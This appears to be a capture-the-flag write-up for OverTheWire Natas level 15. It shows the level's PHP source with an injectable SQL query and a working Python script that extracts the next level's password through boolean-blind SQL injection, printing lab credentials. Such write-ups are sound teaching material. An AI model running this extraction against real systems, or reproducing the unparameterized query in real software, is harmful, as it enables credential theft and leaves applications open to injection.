# Writeup level 15
Again we can inject SQL-Code like in the previous challenge. This time we get only two possible results. If the query is succesful then we get the message: This user exists. If the query fails then we get the message: This user doesn't exists.  
So there is no way to directly print out the password for the user.  
We can use the result message to our advantage since we are able to inject our own SQL Code and check character by character to get the password.

**Source Code**
```php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
}
```
So like I said we are going to get the password character by character. Our SQL Query should look something like this:  
```SQL
SELECT * from users where username="natas16" AND password LIKE BINARY {ourpw}%
```
**BINARY:** to make it Case Sensitve  
**{ourpw}%:** ourpw is the String that is going to end up being the password and the % is a Wildcard in SQL. In this case it just means that the String has to start with {ourpw}.

**Exploit**
```python
import requests
import string

symbols = string.printable[:62]
password = ""
char = 0

while True:
	temp_pw = password
	password += symbols[char]
	# SQL: SELECT * from users where username="natas16" AND password LIKE BINARY {ourpw}%
	sql_injection = f"\" AND password LIKE BINARY \"{password}%"
	postdata = {'username': 'natas16' + sql_injection}
	r = requests.post('http://natas15.natas.labs.overthewire.org/?debug=true', data=postdata, auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
	
	if "This user doesn't exist." in r.text:
		password = temp_pw
		char += 1
	else:
		char = 0

	if char == 62:
		break

	print(f"Password is: {password}")

# WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```

The password is:  
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
